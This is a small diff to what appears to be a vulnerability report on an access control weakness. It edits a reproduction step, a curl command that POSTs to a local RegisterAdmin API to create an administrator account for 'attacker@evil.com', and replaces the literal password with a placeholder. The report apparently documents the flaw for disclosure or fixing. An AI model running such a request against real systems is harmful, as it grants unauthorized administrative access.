@@ -29,7 +29,7 @@ This constitutes a significant access control weakness: the existence and interf
    ```bash
    curl -s -X POST "http://localhost:1337/api/Auth/RegisterAdmin" \
      -H "Content-Type: application/json" \
-     -d '{"UserName": "attacker@evil.com", "Password": "P@ssw0rd!"}'
+     -d '{"UserName": "attacker@evil.com", "Password": "<password>"}'
    ```
 
 6. Observe whether the endpoint is live and accepts the registration request.
